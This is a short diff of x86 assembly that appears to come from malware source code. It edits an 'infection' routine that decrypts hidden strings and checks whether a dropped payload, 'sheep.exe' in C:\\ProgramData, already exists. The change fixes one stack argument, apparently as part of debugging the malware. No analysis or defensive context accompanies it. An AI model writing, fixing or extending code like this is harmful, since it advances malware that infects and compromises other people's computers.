@@ -105,7 +105,7 @@ infection__alloc_powershell_aligned:
    push dword [ebp-8]
    push eax
    call decrypt_string
-   push dword [ebp-0xC]
+   push dword [ebp-0x8]
    call esi                                                       ; GetFileAttributesA("C:\\ProgramData\\sheep.exe")
    cmp eax, 0xFFFFFFFF          ; eax != INVALID_FILE_ATTRIBUTES
    jnz infection__payload_exists
